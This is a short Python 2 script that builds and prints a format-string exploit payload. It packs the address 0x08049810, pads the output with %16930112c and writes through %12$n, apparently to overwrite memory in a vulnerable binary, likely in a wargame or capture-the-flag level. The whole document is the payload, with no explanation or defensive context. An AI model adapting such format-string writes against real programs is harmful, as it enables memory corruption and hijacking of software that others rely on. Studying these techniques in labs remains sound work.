#!/usr/bin/python   

import struct

m =  0x08049810

exploit = struct.pack("I", m)
exploit += "%16930112c"
exploit += "%12$n"
print exploit
